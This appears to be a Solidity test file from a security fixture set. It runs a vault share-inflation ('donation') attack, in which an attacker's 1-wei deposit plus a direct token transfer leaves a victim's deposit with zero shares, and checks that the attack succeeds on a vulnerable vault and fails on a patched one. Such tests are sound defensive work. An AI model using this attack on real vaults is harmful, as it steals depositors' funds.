// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {TestBase, TestToken} from "./TestBase.sol";
import {IERC20} from "fixtures/04-vault-donation/src/IERC20.sol";
import {ShareVault} from "fixtures/04-vault-donation/src/ShareVault.sol";
import {IERC20 as PIERC20} from "fixtures/04-vault-donation-patched/src/IERC20.sol";
import {ShareVault as PatchedVault} from "fixtures/04-vault-donation-patched/src/ShareVault.sol";

interface IShareVault {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract VaultDonationTest is TestBase {
    address internal constant ATTACKER = address(0xBAD);
    address internal constant VICTIM = address(0xA11CE);
    uint256 internal constant DONATION = 10_000e18;
    uint256 internal constant VICTIM_DEPOSIT = 5_000e18;

    function _attack(TestToken asset, IShareVault vault) internal returns (uint256 victimShares, uint256 attackerOut) {
        asset.mint(ATTACKER, 1 + DONATION);
        asset.mint(VICTIM, VICTIM_DEPOSIT);
        vm.startPrank(ATTACKER);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1, ATTACKER);
        asset.transfer(address(vault), DONATION);
        vm.stopPrank();

        vm.startPrank(VICTIM);
        asset.approve(address(vault), type(uint256).max);
        try vault.deposit(VICTIM_DEPOSIT, VICTIM) returns (uint256 s) {
            victimShares = s;
        } catch {}
        vm.stopPrank();

        uint256 attackerShares = vault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        attackerOut = vault.redeem(attackerShares, ATTACKER);
    }

    function test_vulnerable_victimGetsZeroSharesAndAttackerProfits() public {
        TestToken asset = new TestToken();
        ShareVault vault = new ShareVault(IERC20(address(asset)));
        (uint256 victimShares, uint256 attackerOut) = _attack(asset, IShareVault(address(vault)));
        assertEq(victimShares, 0, "victim minted zero shares");
        assertEq(attackerOut, 1 + DONATION + VICTIM_DEPOSIT, "attacker redeemed the victim's deposit");
    }

    function test_patched_attackerLosesDonation() public {
        TestToken asset = new TestToken();
        PatchedVault vault = new PatchedVault(PIERC20(address(asset)));
        (uint256 victimShares, uint256 attackerOut) = _attack(asset, IShareVault(address(vault)));
        assertGt(victimShares, 0, "victim minted shares");
        assertGt(1 + DONATION, attackerOut, "attacker recovers less than it put in");
    }
}
